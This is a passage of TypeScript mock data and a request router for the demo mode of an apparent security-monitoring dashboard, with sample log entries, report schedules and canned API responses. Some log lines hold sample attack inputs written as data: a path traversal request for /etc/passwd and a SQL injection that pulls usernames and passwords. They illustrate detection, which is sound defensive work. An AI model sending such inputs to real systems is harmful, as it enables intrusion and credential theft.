    { id: 3,  agent_id: 1, log_source: 'wineventlog', severity: 'high',     event_id: 7045, hostname: 'WIN-DC-01',     username: null,             source_ip: null,              log_message: 'EventID=7045 | Source=Service Control Manager | ServiceName=NetSvc32 | ImagePath=C:\\Windows\\Temp\\svc.exe', timestamp: hAgo(3) },
    { id: 4,  agent_id: 1, log_source: 'wineventlog', severity: 'high',     event_id: 4672, hostname: 'WIN-DC-01',     username: 'svc_backup',     source_ip: null,              log_message: 'EventID=4672 | Source=Microsoft-Windows-Security-Auditing | User=svc_backup', timestamp: hAgo(4) },
    { id: 5,  agent_id: 3, log_source: 'syslog',      severity: 'error',    event_id: null, hostname: 'LINUX-WEB-01',  username: 'root',           source_ip: '10.0.0.55',       log_message: 'Failed password for root from 10.0.0.55 port 54321 ssh2', timestamp: hAgo(4.5) },
    { id: 6,  agent_id: 3, log_source: 'syslog',      severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: 'deploy',         source_ip: null,              log_message: 'sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash', timestamp: hAgo(5) },
    { id: 7,  agent_id: 3, log_source: 'syslog',      severity: 'critical', event_id: null, hostname: 'LINUX-WEB-01',  username: 'root',           source_ip: null,              log_message: 'pam_unix(sshd:session): session opened for user root by (uid=0)', timestamp: hAgo(5.5) },
    { id: 8,  agent_id: 3, log_source: 'nginx',       severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '192.168.1.200',   log_message: 'GET /admin/../etc/passwd', timestamp: hAgo(6) },
    { id: 9,  agent_id: 3, log_source: 'apache',      severity: 'warning',  event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '192.168.1.200',   log_message: "GET /search?q=1'+UNION+SELECT+null,username,password+FROM+users--", timestamp: hAgo(6.5) },
    { id: 10, agent_id: 3, log_source: 'nginx',       severity: 'info',     event_id: null, hostname: 'LINUX-WEB-01',  username: null,             source_ip: '45.33.32.156',    log_message: 'GET /robots.txt', timestamp: hAgo(7) },
    { id: 11, agent_id: 5, log_source: 'application', severity: 'critical', event_id: null, hostname: 'WIN-SERVER-02', username: null,             source_ip: null,              log_message: 'FATAL: Unhandled exception in payment module — NullReferenceException at PaymentService.Process()', timestamp: hAgo(8) },
    { id: 12, agent_id: 5, log_source: 'application', severity: 'error',    event_id: null, hostname: 'WIN-SERVER-02', username: null,             source_ip: null,              log_message: 'ERROR: DB connection failed — password=Sup3rS3cr3t! stored in config', timestamp: hAgo(9) },
  ],
}

// ── Scheduled Report mock data ────────────────────────────────────────────────

const DEMO_SCHEDULED_CONFIGS = [
  { report_type: 'daily_soc',          enabled: true,  recipients: 'soc@netcradus.com',           last_run_at: hAgo(18), updated_at: dAgo(7) },
  { report_type: 'monthly_compliance', enabled: true,  recipients: 'ciso@netcradus.com,audit@netcradus.com', last_run_at: dAgo(5), updated_at: dAgo(30) },
  { report_type: 'weekly_exec',        enabled: false, recipients: null,                            last_run_at: null,     updated_at: dAgo(14) },
]

const DEMO_REPORT_HISTORY = {
  total: 6,
  offset: 0,
  limit: 20,
  items: [
    { id: 1, report_type: 'daily_soc',          period_start: dAgo(1),  period_end: hAgo(0),  file_size: 41230, generated_at: hAgo(18), triggered_by: 'schedule', status: 'done',    error: null },
    { id: 2, report_type: 'weekly_exec',         period_start: dAgo(7),  period_end: dAgo(0),  file_size: 63820, generated_at: dAgo(1),  triggered_by: 'manual',   status: 'done',    error: null },
    { id: 3, report_type: 'monthly_compliance',  period_start: dAgo(30), period_end: dAgo(0),  file_size: 97105, generated_at: dAgo(5),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 4, report_type: 'daily_soc',           period_start: dAgo(2),  period_end: dAgo(1),  file_size: 38944, generated_at: dAgo(1),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 5, report_type: 'daily_soc',           period_start: dAgo(3),  period_end: dAgo(2),  file_size: 40112, generated_at: dAgo(2),  triggered_by: 'schedule', status: 'done',    error: null },
    { id: 6, report_type: 'daily_soc',           period_start: dAgo(4),  period_end: dAgo(3),  file_size: null,  generated_at: dAgo(3),  triggered_by: 'schedule', status: 'failed',  error: 'SMTP connection refused' },
  ],
}

// ── Router ────────────────────────────────────────────────────────────────────

export function resolveDemoResponse<T>(path: string, method = 'GET'): T {
  const base = path.split('?')[0].replace(/\/+$/, '')

  // ── Mutations ─────────────────────────────────────────────────────────────
  if (method !== 'GET') {
    if (base.includes('/toggle')) return { enabled: true, id: 0 } as unknown as T
    if (base.includes('/support/tickets')) return { id: 1, status: 'Open', message: 'Your ticket has been submitted. Our team will review it shortly.' } as unknown as T

    // POST /incidents/{id}/notes → return a demo InvestigationNote
    const notePost = base.match(/^\/incidents\/(\d+)\/notes$/)
    if (notePost) {
      return {
        id: Date.now(), user_name: 'Demo Admin', note_type: 'note',
        content: '(demo) Note saved.', created_at: new Date().toISOString(),
      } as unknown as T
    }

    // POST /incidents/{id}/evidence → return a demo EvidenceItem
    const evPost = base.match(/^\/incidents\/(\d+)\/evidence$/)
    if (evPost) {
      return {
        id: Date.now(), added_by_name: 'Demo Admin', title: '(demo) Evidence',
        evidence_type: 'note', content: null, created_at: new Date().toISOString(),
      } as unknown as T
    }

    // PUT /incidents/{id}/resolve → return the matched incident as Resolved
    const resolveMatch = base.match(/^\/incidents\/(\d+)\/resolve$/)
    if (resolveMatch) {
      const id = parseInt(resolveMatch[1])
      const inc = DEMO_INCIDENTS.find((i) => i.id === id) ?? DEMO_INCIDENTS[0]
      return { ...inc, status: 'Resolved', resolved_at: new Date().toISOString() } as unknown as T
    }

    // PUT /incidents/{id}/status
    const statusMatch = base.match(/^\/incidents\/(\d+)\/status$/)
    if (statusMatch) {
      const id = parseInt(statusMatch[1])
      const inc = DEMO_INCIDENTS.find((i) => i.id === id) ?? DEMO_INCIDENTS[0]
      return { ...inc } as unknown as T
    }

    // PUT /reports/scheduled/{report_type}
    const schedPutMatch = base.match(/^\/reports\/scheduled\/(.+)$/)
    if (schedPutMatch) {
      return { report_type: schedPutMatch[1], enabled: true, recipients: null, updated_at: new Date().toISOString() } as unknown as T
    }

    // POST /reports/trigger/{report_type}
    const triggerMatch = base.match(/^\/reports\/trigger\/(.+)$/)
    if (triggerMatch) {
      return { status: 'accepted', task_id: 'demo-task-report', report_type: triggerMatch[1], tenant_id: 9999 } as unknown as T
    }

    // POST /reports/generate
    if (base === '/reports/generate') {
      return { status: 'accepted', task_id: 'demo-task-report-cache', tenant_id: 9999 } as unknown as T
    }

    // POST /iocs/sync
    if (base === '/iocs/sync') {
      return { status: 'accepted', task_id: 'demo-task-ioc-sync', tenant_id: 9999 } as unknown as T
    }

    // POST /threat-feeds/enrich/{ioc_id}
    const enrichMatch = base.match(/^\/threat-feeds\/enrich\/(\d+)$/)
    if (enrichMatch) {
      return { status: 'accepted', ioc_id: parseInt(enrichMatch[1]), task_id: 'demo-task-enrich-' + enrichMatch[1] } as unknown as T
    }

    // POST /threat-feeds/lookup-async
    if (base === '/threat-feeds/lookup-async') {
      return { status: 'accepted', task_id: 'demo-task-lookup' } as unknown as T
    }

    return {} as unknown as T
  }

  // ── GET: Exact matches ────────────────────────────────────────────────────
  if (base === '/alerts/stats')         return DEMO_ALERT_STATS                                                       as unknown as T
  if (base === '/alerts/open')          return DEMO_ALERTS.filter((a) => a.status === 'Open').slice(0, 10)          as unknown as T
  if (base === '/incidents/stats')      return DEMO_INCIDENT_STATS   as unknown as T
  if (base === '/users/me')             return DEMO_ME               as unknown as T
  if (base === '/threat-feeds/config')  return DEMO_FEED_CONFIG      as unknown as T
  if (base === '/notifications/config') return DEMO_NOTIF_CONFIG     as unknown as T
  if (base === '/reports/summary')    return DEMO_REPORT_SUMMARY    as unknown as T
  if (base === '/reports/scheduled')  return DEMO_SCHEDULED_CONFIGS as unknown as T
  if (base === '/reports/history')    return DEMO_REPORT_HISTORY    as unknown as T
  if (base === '/org/info')           return DEMO_ORG               as unknown as T

  // ── GET: Incident sub-paths (must be checked before the /incidents/{id} match) ──
  const notesMatch    = base.match(/^\/incidents\/(\d+)\/notes$/)
  const evidenceMatch = base.match(/^\/incidents\/(\d+)\/evidence$/)
  if (notesMatch) {
    const id = parseInt(notesMatch[1])
    return ((DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]).notes) as unknown as T
  }
  if (evidenceMatch) {
    const id = parseInt(evidenceMatch[1])
    return ((DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]).evidence) as unknown as T
  }

  // ── GET: Specific incident detail ─────────────────────────────────────────
  const incidentMatch = base.match(/^\/incidents\/(\d+)$/)
  if (incidentMatch) {
    const id = parseInt(incidentMatch[1])
    return (DEMO_INCIDENT_DETAILS.find((i) => i.id === id) ?? DEMO_INCIDENT_DETAILS[0]) as unknown as T
  }

  // ── GET: Prefix matches ───────────────────────────────────────────────────
  if (base.startsWith('/alerts')) {
    // /alerts/ returns paginated AlertsPage; apply basic filters from query string
    const qs = path.includes('?') ? new URLSearchParams(path.split('?')[1]) : new URLSearchParams()
    const status   = qs.get('status')
    const severity = qs.get('severity')
    const offset   = parseInt(qs.get('offset') ?? '0')
    const limit    = parseInt(qs.get('limit')  ?? '25')
    let items = DEMO_ALERTS.map((a) => ({
      ...a,
      agent_hostname: DEMO_AGENTS.find((g) => g.id === a.agent_id)?.hostname ?? null,
    }))
    if (status)   items = items.filter((a) => a.status === status)
    if (severity) items = items.filter((a) => a.severity === severity)
    return { total: items.length, offset, limit, items: items.slice(offset, offset + limit) } as unknown as T
  }
  if (base.startsWith('/agents'))          return DEMO_AGENTS           as unknown as T
  if (base.startsWith('/incidents'))       return DEMO_INCIDENTS        as unknown as T
  if (base.startsWith('/iocs'))            return DEMO_IOCS             as unknown as T
  if (base.startsWith('/detection-rules')) return DEMO_DETECTION_RULES  as unknown as T
  if (base.startsWith('/audit-logs'))      return DEMO_AUDIT_LOGS       as unknown as T
  if (base.startsWith('/users'))           return DEMO_USERS            as unknown as T
  if (base.startsWith('/commands'))        return DEMO_COMMANDS         as unknown as T
  if (base.startsWith('/support'))         return []                    as unknown as T
  if (base.startsWith('/platform'))        return []                    as unknown as T

  // ── GET: Task status ─────────────────────────────────────────────────────
  const taskMatch = base.match(/^\/tasks\/(.+)$/)
  if (taskMatch) {
    return { task_id: taskMatch[1], status: 'SUCCESS', result: { queued: 0 } } as unknown as T
  }

  // ── GET: Threat hunt endpoints ────────────────────────────────────────────
  if (base === '/hunt/process')     return DEMO_HUNT_PROCESS     as unknown as T
  if (base === '/hunt/hash')        return DEMO_HUNT_HASH        as unknown as T
  if (base === '/hunt/ip')          return DEMO_HUNT_IP          as unknown as T
  if (base === '/hunt/domain')      return DEMO_HUNT_DOMAIN      as unknown as T
  if (base === '/hunt/persistence') return DEMO_HUNT_PERSISTENCE as unknown as T

  // ── GET: Log telemetry ────────────────────────────────────────────────────
  if (base === '/telemetry/logs' || base.startsWith('/telemetry/logs')) return DEMO_LOG_TELEMETRY as unknown as T

  return [] as unknown as T
}
